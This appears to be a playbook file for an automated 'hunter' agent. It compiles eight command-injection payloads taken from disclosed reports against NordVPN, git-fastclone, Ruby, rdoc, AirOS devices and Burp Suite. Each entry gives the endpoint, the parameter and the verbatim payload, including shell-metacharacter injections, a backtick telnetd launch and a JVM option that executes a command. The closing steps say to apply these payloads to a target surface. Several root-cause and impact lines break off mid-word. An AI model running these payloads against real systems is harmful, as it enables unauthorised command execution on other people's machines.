---
name: hunter-l4-command-injection
description: "Detect and exploit command injection with real payloads."
domain: cybersecurity
subdomain: web
tags:
- web
- command-injection
- hunting
- l4
version: '1.0'
---
# L4 Playbook: Command Injection (hunter)

**L3 technique sheet:** `knowledge/sheets/command-injection.md` — (pending L3 synthesis)

## When to use
Attack a target surface for Command Injection. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 1001255 [ajaysenr]
- endpoint: `NordVPN.Notification: (custom URI protocol)`
- parameter: `OpenUrl`
- payload: `NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA`
- root cause: The NordVPN Windows client passes an attacker-controlled OpenUrl argument received via the NordVPN.Notification custom protocol straight to Process.St
- impact: Proven: tricking a user into opening the malicious NordVPN.Notification: URL (via iframe) launched calc.exe on the Windows client (tested on v6.31.5.0

### 105190 [ajaysenr]
- endpoint: `CLI: git fastclone <repo>`
- parameter: `N/A (repo/submodule URL)`
- payload: `git fastclone "'"'$(cat /etc/passwd >&2)'"'"`
- root cause: git-fastclone passes strings built with plain Ruby interpolation into Cocaine::CommandLine.new, which does not protect interpolated arguments from com
- impact: Proved command execution: a crafted argument / submodule URL injected shell commands (cat /etc/passwd) during git fastclone.

### 1158824 [ajaysenr]
- endpoint: `ruby -run -e wait_writable (lib/un.rb)`
- parameter: `file name argument`
- payload: `| touch evil.txt`
- root cause: wait_writable in lib/un.rb passes user-supplied file names to open() which invokes the shell, so a filename containing shell metacharacters executes c
- impact: Proven arbitrary command execution: a file named '| touch evil.txt' passed to wait_writable executed 'touch evil.txt', creating the evil.txt file.

### 1161691 [ajaysenr]
- endpoint: `rdoc --all (CLI) processing filenames`
- parameter: `filename`
- payload: `| touch evil.txt && echo tags`
- root cause: remove_unparseable() called Kernel#open on a filename starting with '|', which executes the filename as a shell command (pipe-open behavior) when the 
- impact: Executed arbitrary command as the rdoc user: the PoC created evil.txt in the current directory ('touch evil.txt && echo tags').

### 119317 [ajaysenr]
- endpoint: `GET /sptest_action.cgi`
- parameter: `target`
- payload: `192.168.0.100;touch /tmp/vulnerable;`
- root cause: sptest.inc line 46 passes the target parameter unsanitized into exec(), so a read-only user can inject shell commands.
- impact: Confirmed a read-only user can inject shell commands (e.g. ;touch /tmp/vulnerable;) into the exec() call, executing arbitrary commands on the AirOS de

### 121940 [ajaysenr]
- endpoint: `POST /usr/www/dl-fw.cgi`
- parameter: `fw_url`
- payload: `http://www.nccgroup.trust/testtest123/`telnetd``
- root cause: dl-fw.cgi passed the unsanitized fw_url parameter directly into a shell exec() command line.
- impact: Executed arbitrary shell commands on the airOS device; the PoC started the telnetd service via backtick injection and a reverse shell was also demonst

### 1274695 [ajaysenr]
- endpoint: `N/A (Burp Suite desktop app)`
- payload: `-Xmx5m and -XX:OnOutOfMemoryError=open -a Calculator`
- root cause: Burp's embedded headless Chrome ran with remote debugging over a websocket port, allowing a clickjacking + port-sniffing attack to grab the debugging 
- impact: Launched the Calculator app on the victim's machine via -XX:OnOutOfMemoryError=open -a Calculator after Burp restart, gaining code execution with the 

### 128750 [ajaysenr]
- endpoint: `AirOS speed-test client (parseHeaders/doLogin in remote.inc)`
- parameter: `Set-Cookie session_key`
- payload: `Set-Cookie: AIROS_`reboot`=12345678901234567890123456789012`
- root cause: A Set-Cookie header parsed from the speed-test peer is unsanitized and concatenated into a shell command executed via exec() during doLogin.
- impact: Demonstrated injection of a shell command (`reboot`) through a malicious Set-Cookie header returned by an attacker-controlled speed-test server, enabl

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

